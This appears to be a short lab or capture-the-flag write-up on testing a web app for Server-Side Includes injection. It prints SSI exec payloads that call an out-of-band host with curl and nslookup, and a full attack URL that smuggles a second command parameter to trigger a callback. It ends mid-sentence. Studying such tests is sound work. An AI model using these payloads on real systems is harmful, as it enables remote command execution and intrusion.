# SSI Injection To RCE

## 1. Overview

The purpose of this assessment was to investigate possible Server-Side Includes (SSI) Injection vulnerabilities in the target application.

The testing focused on parameter discovery, input processing, SSI syntax handling, file-writing behavior, and out-of-band (OOB) interactions.

## 2. Parameter Discovery and Initial Testing

During parameter discovery, the `cmd` parameter was identified alongside the existing `msg` parameter.

Both parameters were tested separately:

- `msg`: Accepted input and was associated with storing data in `test.txt`.

- `cmd`: Processed input independently and returned the expected output.

When both parameters were submitted together, the application returned an error. This behavior indicated that the parameters were handled differently and required separate testing.

## SSI Injection Testing

SSI directives were also tested to determine whether server-side processing was enabled.

The following payloads were examined:

```html
<!--#include file="test.txt" -->
```

```html
<!--#include virtual="/test.txt" -->
```

<!--#exec cmd="curl https://UNIQUE-ID.oast-domain.example" -->

<!--#exec cmd="nslookup UNIQUE-ID.oast-domain.example" -->

The application rejected SSI-related syntax with an `is not allowed` response.

Based on the observed results, successful SSI directive execution and file inclusion were not demonstrated.

## 5. Out-of-Band Testing

Out-of-band testing was considered to investigate whether the backend could initiate external requests.

A callback destination hosted on OAST was used in the final crafted request:

```text
curl http://l7tsb6ip94z79n7tg046w5ukyb42suqif.oastify.com
```

The final URL used during testing was:

```url
https://b60b117c27.0o8.ir/api?msg=test%26cmd=curl%20http://l7tsb6ip94z79n7tg046w5ukyb42suqif.oastify.com&cmd=echo%20%22%24%28cat%20test.txt%29%22
```

```php
echo "$(cat test.txt)"
```

This request combined the `msg` and `cmd` parameters and attempted to trigger an external HTTP request from the backend.

The URL represents the final testing request; successful command execution .




